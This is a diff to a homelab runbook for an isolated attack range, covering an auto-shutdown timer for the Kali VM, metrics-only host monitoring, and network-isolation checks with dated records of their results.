+is in use and the deadline is past or close, extend it now. `range-extend`
+works before the timer is on:
+
+```bash
+ssh "$G" 'range-extend 3 && homelab-ragnarok-stop status'
+```
+
+Then turn the timer on. Its first run is within a minute, because
+`OnBootSec` has long passed on a host that is already up:
+
+```bash
+ssh "$G" 'systemctl enable --now homelab-ragnarok-stop.timer &&
+  systemctl is-active homelab-ragnarok-stop.timer'
+```
+
+The self-test exercises every branch with fakes, so it can run on the host
+without stopping anything.
+
+Running it, as root on `gandalf`:
+
+| | |
+| --- | --- |
+| `homelab-ragnarok-stop status` | The deadline and the minutes left, or that `ragnarok` is not running |
+| `range-extend 3` | Set the deadline three hours from now. 1 to 12. It can also bring the deadline closer. It refuses while `ragnarok` is stopped, and a new start begins again from six hours |
+| `journalctl -t homelab-ragnarok-stop` | Every warning, extension, wait and stop |
+
+At 30 minutes and again at 5, every shell on the host and inside `ragnarok`
+gets a `wall` message that says how to extend. Past the deadline the next run
+shuts the VM down, unless `dpkg` holds its lock inside it. Then it waits for
+the run after that. `range-extend` runs on the host, not in the VM. Nothing
+reaches the Proxmox web UI or a VNC console, so a session driven only from
+`8006` gets no warning. Check `status` from a shell when you start one.
+
+**Prove it once after installing.** Start `ragnarok`, then set its deadline
+a few minutes out by writing the state files the way an extension does:
+
+```bash
+pid=$(cat /var/run/qemu-server/130.pid)
+printf '%s\n' "$pid" > /run/homelab-ragnarok-stop/run
+printf '%s\n' "$(( $(date +%s) + 330 ))" > /run/homelab-ragnarok-stop/deadline
+homelab-ragnarok-stop status
+```
+
+Within a minute, `journalctl -t homelab-ragnarok-stop` should show the
+5-minute warning. A minute past the deadline it should show the stop, and
+`qm status 130` should read `stopped`. Then `homelab-ragnarok-stop status`
+should say it is not running, and `range-extend 2` should refuse.
+
+> **Installed on `gandalf` 2026-11-22 at 19:26**, in place of ADR-0124's
+> host power-off timer, which had been installed at 17:44 and never fired.
+> The self-test passed all 25 checks on the box, lock interleavings
+> included, `systemd-analyze` printed nothing, and a run by hand ended
+> `Result=success`. `range-extend 1` set a deadline 60 minutes out.
+>
+> **Proved the same evening** by the steps above, with the deadline at
+> 19:31:54. The first run, at 19:27:17, was inside five minutes, so it sent
+> the single 5-minute warning, as the self-test expects. The run at 19:32:34
+> logged `deadline 2026-11-22 19:31 has passed; stopping ragnarok`, and the
+> `qmshutdown` task ended `OK` at 19:32:38. ACPI was enough, so the forced
+> stop never ran. The unit ended `Result=success` under its sandbox. After
+> it, `status` read `not running`, the state directory held only its lock,
+> and `range-extend 2` refused with exit `1`. The guest-agent `wall` returned
+> `exitcode 0`. No shell was open inside the VM to see it, so a warning
+> reaching a session in `ragnarok` has not been observed. Every message was
+> logged twice, by `logger` and by the unit's stdout. The script now skips
+> `logger` under systemd, and was reinstalled. The installed files match the
+> repository by `sha256sum`.
+
+### Monitoring the host
+
+`gandalf` stays on, so the per-session read-back above is a gap of days.
+[ADR-0126](../adr/0126-monitor-gandalf-now-that-it-stays-on.md) gives it the
+same Alloy agent `Saruman` has, reporting *hypervisor state* — the ADR-0028
+class, not guest telemetry — to `prometheus`, with alerts for the faults this
+section used to catch by hand. **Deployed on 2026-11-23** ([#1651](https://github.com/Gerrrt/HomeLab/issues/1651)): the agent, the `morpheus` pass and the rules are live, metrics-only.
+
+**First, the pass.** The agent pushes metrics to `10.0.99.20:9090`. On
+`morpheus`, add a host-scoped pass `10.0.30.30 → 10.0.99.20` on `9090`,
+**metrics only** — beside the two that already carry ImaginationLAN there, and
+above the block to Winterfell. No `3100`: the range host does not ship logs
+(below). This is the one crossing ADR-0014 counts, and it is outbound.
+
+**Upgrade the stop helper first.** `collect-range-state.sh` reads the deadline
+from `homelab-ragnarok-stop deadline-epoch`, a subcommand added for the
+monitor. An older helper without it makes the collector leave the `ragnarok`
+metrics out rather than read a false "stopped", so reinstall the current script
+(*The attack VM's timer* above does the same) before the collector:
+
+```bash
+scp scripts/ragnarok-stop.sh root@10.0.30.30:/usr/local/sbin/homelab-ragnarok-stop
+ssh root@10.0.30.30 'chmod 0755 /usr/local/sbin/homelab-ragnarok-stop && homelab-ragnarok-stop deadline-epoch'
+```
+
+**Then the collectors**, host-only. From a Hicks workstation, install each by
+name with [`install-agent-collectors.sh`](../../scripts/install-agent-collectors.sh),
+which runs it once per collector:
+
+```bash
+for c in pve-firewall-state range-state guest-state smart-state patch-state pve-version; do
+  scripts/install-agent-collectors.sh --only "$c" root@10.0.30.30
+done
+```
+
+**Not** `guest-disk-state` or `guest-service-state`: both read *inside* a guest
+through its agent (`qm guest cmd … get-fsinfo`), which on the range would read
+a target's filesystem — guest telemetry from the attacker's segment, which
+ADR-0126 does not allow. `range-state` is `gandalf`'s own control file
+([`collect-range-state.sh`](../../scripts/collect-range-state.sh)): the
+`vmbr1_host_in` ingress barrier, `vmbr0` and `sshd` forwarding, and the
+`ragnarok` stop timer and the deadline it set.
+
+**Then the agent, metrics only.** `gandalf`'s journal and auth logs can carry
+what happens on the attacker's segment, so its agent must not ship them to
+Loki. The log pipeline is its own file, `logs.alloy`, deployed with
+`config.alloy` everywhere but here;
+[`deploy-agent.sh`](../../scripts/deploy-agent.sh) `--metrics-only` leaves it
+off and verifies metrics alone.
+
+**Register `gandalf`'s ingest token first**, or the deploy stops for a missing
+token and the proxy answers every push with `401`. Do
+[`add-monitored-device.md`](add-monitored-device.md)'s *First, the host's
+token*: add `INGEST_TOKEN_GANDALF` to `secrets/observability.sops.yaml` (the
+hostname upper-cased, as `deploy-agent.sh` looks it up), add
+its line to the ingest proxy's allowlist and compose environment, and `make up`
+so the proxy is recreated with it — exporting the token on Hicks alone does not
+register it. Then, from a Hicks workstation:
+
+```bash
+scripts/deploy-agent.sh --metrics-only --runtime native root@10.0.30.30
+```
+
+`--runtime native` because `gandalf` runs the package, not a container; a
+docker host cannot be metrics-only, since `docker.alloy` needs the log
+pipeline. The agent then pushes node and collector metrics to
+`10.0.99.20:9090` and no logs. This is the one crossing the `morpheus` pass
+above carries.
+
+**What it watches.** Once the collectors report, `gandalf` joins the
+`PveFirewall*` alerts in `host.rules.yaml`, and
+[`range.rules.yaml`](../../stacks/observability/prometheus/rules/range.rules.yaml)
+adds: the firewall enabled with zero host rules (`PveFirewallZeroRules`), the
+ingress barrier down, `vmbr0` or `sshd` forwarding on, and the stop timer
+failing — `ragnarok` running with the timer inactive, or past the deadline the
+timer itself set (a dpkg wait inside the VM is excluded, so a protected install
+is not mistaken for a failed timer). `RangeStateStale` catches the collector
+itself stopping, so a barrier that falls after it goes quiet is not read as
+healthy. `DisposableGuestOutlived` also begins covering any
+`disposable`-tagged guest here. Host uptime is deliberately not alerted: an
+always-on host has no "up too long" fault (ADR-0126).
+
+**Tag the range guests, and baseline the range SSD — or the general host rules
+fire on `gandalf`'s resting state.** `HypervisorGuestStopped` in
+[`host.rules.yaml`](../../stacks/observability/prometheus/rules/host.rules.yaml)
+pages on any guest stopped for an hour unless it is tagged `disposable` or
+`on-demand`, a template, or mid-clone (ADR-0071, ADR-0079). The range's targets
+sit stopped and reverted between sessions, and `ragnarok` is stopped until a
+session needs it, so both are `on-demand` — not `disposable`, which the targets
+would outlive: `DisposableGuestOutlived` fires on a `disposable` guest once it
+passes fourteen days from creation, stopped or not, and the targets are kept and
+reverted, not destroyed. The targets are not in `tofu/`, so tag them by hand,
+once as root on `gandalf`: `qm set <vmid> --tags on-demand` for each (100, 101,
+102). `ragnarok` is `tofu`-managed, so its `on-demand` is declared in
+[`tofu/guests.tf`](../../tofu/guests.tf) beside `attack` and `range`, not set by
+hand — a `qm set` there is undone on the next apply. And
+`SmartDriveBadSectors` pages above a recorded baseline, so a drive with a known
+count needs a row in
+[`render-smart-baselines.sh`](../../scripts/render-smart-baselines.sh): the
+range pool's SSD read 8 reallocated sectors on 2026-11-24 (#1651), stable since
+2026-11-13, and now carries that baseline. Both were missed when `gandalf` was
+first onboarded, and both surfaced as five warnings the day the guests crossed
+the hour.
 
 ---
 
@@ -969,9 +1557,10 @@ by anything else in this repository.
 >   and dhcpcd stopped, the guest had no default route, and both pings gave
 >   `Network is unreachable` while `172.30.30.10` answered. `ragnarok` is not
 >   affected, because its `eth0` takes a real lease. Since #1341 the build
->   removes the stanza before templating. **Until 902 is rebuilt, a
->   static-only clone of it on `vmbr1` needs that file removed before this
->   check passes.**
+>   removes the stanza before templating. 902 was rebuilt on 2026-11-22,
+>   after #1341 merged (`range/base-902-disk-1` is dated that day), so a new
+>   clone should not carry the file. The next check four on a static clone
+>   is what proves it.
 
 **One — `gandalf` is single-homed, and `vmbr1` has no port.** On the host:
 
@@ -1004,19 +1593,20 @@ nft list ruleset 2>/dev/null | grep -Ei 'masquerade|snat' || echo "no NAT"
 iptables -t nat -S 2>/dev/null | grep -- '-j MASQUERADE' || echo "no legacy NAT"
 systemctl is-enabled nftables; sudo nft list chain inet range_scope output | grep 'policy drop'
 sudo nft list chain netdev range_scope_l2 egress | grep 'policy drop'
-ping -n -c1 -W2 1.1.1.1
+python3 -c 'import socket; socket.socket(socket.AF_INET, socket.SOCK_DGRAM).sendto(b"x", ("1.1.1.1", 9))'
 ```
 
 Both sysctls `= 0`, and no NAT from either table — Kali's `iptables` is
 nft-backed, so the two commands can disagree about a rule that exists.
-`nftables` reads `enabled`, the `range_scope` chain is loaded with
-`policy drop`, and the ping fails with *Operation not permitted*: the filter
-refused it. A timeout is not a pass, because it is what the internet being down
-looks like too. The raw-Ethernet half, a frame to `1.1.1.1` through a packet
-socket that must raise `range_scope_l2`'s `out_of_scope` counter, needs a
-crafted frame, so it is left to `finish-attack-vm.sh`. Run this after
-installing anything that touches the network stack, and after any install that
-lifted the scope, not just once.
+`nftables` reads `enabled`, the `range_scope` chain is loaded with `policy
+drop`, and the send fails with `PermissionError: [Errno 1] Operation not
+permitted`: the filter refused it. Use the Python line, not `ping`. Kali's
+`ping` (iputils 20250605) reports a refused send as plain packet loss, which
+looks the same as the internet being down, so it proves nothing either way. The
+raw-Ethernet half, a frame to `1.1.1.1` through a packet socket that must raise
+`range_scope_l2`'s `out_of_scope` counter, needs a crafted frame, so it is left
+to `finish-attack-vm.sh`. Run this after installing anything that touches the
+network stack, and after any install that lifted the scope, not just once.
 
 **Four — a target has no route anywhere.** On a target:
 
@@ -1030,6 +1620,50 @@ No `default` line in the first, and both pings failing with *Network is
 unreachable* rather than timing out. A timeout means a default route exists and
 something is swallowing the packets, which is a different and much worse state:
 it is a filtered target rather than an unrouted one.
+
+Then prove that the host takes nothing from the range, which is what a rooted
+target would try next (§2, `vmbr1_host_in`). On `gandalf`, read the counter:
+
+```bash
+nft list counter netdev vmbr1_host_in dropped
+```
+
+On the target, give it the route an attacker would add, send once, and take
+the route away:
+
+```bash
+ip route add 10.0.30.30/32 dev eth0
+ip neigh flush to 10.0.30.30
+ping -c2 -W1 10.0.30.30
+ip neigh show 10.0.30.30
+ip route del 10.0.30.30/32 dev eth0
+```
+
+The flush drops any neighbour entry an earlier probe left, so the ping has to
+start a fresh ARP exchange. Without it, a cached `REACHABLE` entry would read
+as an unloaded table even while the table drops every ping. The pings should
+get no reply, and the `ip neigh show` line should read `FAILED` or
+`INCOMPLETE`: the host never answered ARP. The
+counter on `gandalf` should have risen. A reply, or a `REACHABLE` neighbour,
+means the table is not loaded. The target should still answer `ragnarok`'s
+ping, which shows that the table drops traffic to the host and not traffic
+between guests.
+
+> **Check four ran on `gandalf` 2026-11-22 at 19:25**, after the reboot that
+> proved §2, on a throwaway full clone of `tpl-kali` at `172.30.30.199`,
+> VMID 199. Its `net0` was moved to `vmbr1` before its first boot, because
+> the template's is on `vmbr0`. The commands ran through the guest agent, and
+> the clone was destroyed afterwards.
+>
+> - **No DHCP stanza.** `interfaces.d` held only `50-cloud-init`, so the
+>   template rebuilt that day after #1341 no longer carries the file.
+> - **No route.** The only route was `172.30.30.0/24 dev eth0`. Both pings
+>   gave `Network is unreachable`.
+> - **The host takes nothing.** With the on-link route to `10.0.30.30`, both
+>   pings went unanswered, the neighbour read `INCOMPLETE`, and the `dropped`
+>   counter rose from 20 to 23 packets.
+> - **Guests still reach each other.** `ragnarok` pinged `172.30.30.199` with
+>   2 of 2 replies.
 
 ---
 
@@ -1113,15 +1747,21 @@ Addresses are parsed at query time rather than indexed, per
 
 ## Also worth knowing
 
-**The range is not monitored and not backed up, and both are decisions.**
-ADR-0017 declines an Alloy agent because `gandalf` is off by design, so any rule
-watching it is permanently firing or permanently silenced; and it declines PBS
+**The range is monitored but not backed up.** ADR-0017 declined an Alloy agent
+because `gandalf` was off by design, so any rule watching it would be
+permanently firing or permanently silenced. Since
+[ADR-0125](../adr/0125-keep-gandalf-on-and-stop-ragnarok-on-a-timer.md) the
+host stays on, and since 2026-11-23 its metrics-only agent and the range rules
+are live (*Monitoring the host*, above;
+[#1651](https://github.com/Gerrrt/HomeLab/issues/1651)). ADR-0017 also declines PBS
 because a deliberately-vulnerable image in the estate's backup store is a
 supported path for it to arrive somewhere it should not be. If you find yourself
 wanting to back something up here, the thing you want to keep has stopped being
 range and started being estate, and it is on the wrong machine.
 
-**The tripwire is the only thing watching.** `pass` + `log` for
+**The tripwire is the only thing watching the segment's edge.** The range
+rules watch `gandalf` itself; what crosses from ImaginationLAN into the house
+is seen only by the tripwire: `pass` + `log` for
 `vlan30 net → Internal_Segments` on the ImaginationLAN interface, below the
 blocks and the `quick` iLO pass, above the `→ any` egress rule
 ([#234](https://github.com/Gerrrt/HomeLab/issues/234)). It matches nothing while
